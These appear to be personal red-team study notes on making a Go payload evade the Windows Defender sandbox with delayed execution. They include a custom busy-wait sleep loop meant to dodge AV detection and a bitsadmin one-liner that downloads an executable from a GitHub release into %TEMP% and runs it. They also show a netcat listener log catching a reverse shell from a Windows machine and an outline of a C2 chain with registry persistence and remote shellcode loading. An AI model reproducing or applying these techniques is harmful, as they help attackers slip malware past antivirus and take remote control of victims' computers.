========Delay Execution==============
- Used to evade sandbox as we delay execution.
- The idea here is to stop execution before performing any malicious action.
----> Causes the sandbox checks to timeout and not flag our payload as malicious.

------------Disadvantages of the technique----------
1. AV might detect the exe has a sleep function in its main and flag it.
-------> call the sleep function outside the main() within its own function
2. Some AV engines will speed up the sleep function.

=========1. time.Sleep() 1/2===========
- In the previous payload there was a pop up suggesting defender suspects payload
as malicious.
- By adding sleep at the beggining of our code it causes defender sandbox to timeout.
	`time.Sleep(10* time.Second)`

====2. More Advance Sleep Way===============
- Sometimes running a sleep function just before execution begins is detected by AV
engines as malicious.
-----> Create a custom sleep function
*******************************************************************
	var t0, t1 time.Time
	fmt.Println("[+] Sleeping for 10 Seconds")
	t0 = time.Now()
	for {
		t1 = time.Now()
		diff := t1.Sub(t0)

		if diff.Seconds() > 10 {
			break
		}

	}

	fmt.Println("[+] Woke Up ... Execution Continues")
*******************************************************************
- Above we use an infinite loop as lonf as the difference of t0 and t1 is less than 10 Seconds
- Break command allows us to exit the loop.
Running:
	cmd>> bitsadmin /transfer myJob /download /priority foreground "https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/main.exe" %TEMP%\d.exe && start %TEMP%\d.exe
Uses LOTLBins to download and run our payload.
On Kali Linux:
*******************************************************************************                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.106] 62269
Microsoft Windows [Version 10.0.19045.6466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user>whoami
whoami
desktop-lsf7uhq\user
*******************************************************************************                                                                                                                                                                     

==========WHAT HAPPEND=========
1. We are injecting directly our shellcode into a process.
2. The Shellcode is not inside the program but loaded from a remote server.
3. Introduced a sleeper function at the begging of the program to bypass Defender sandbox.
4. Time to introduce encryption.

====SImple C2 theory=====
- Downloads the loader
- Loader adds its self to the registry
- Then sleeps.
- Wakes up download the shellcode from github.com
- Attacker gets a shell for the day.
NOTE: This is not viable way---> use a VPS for C2.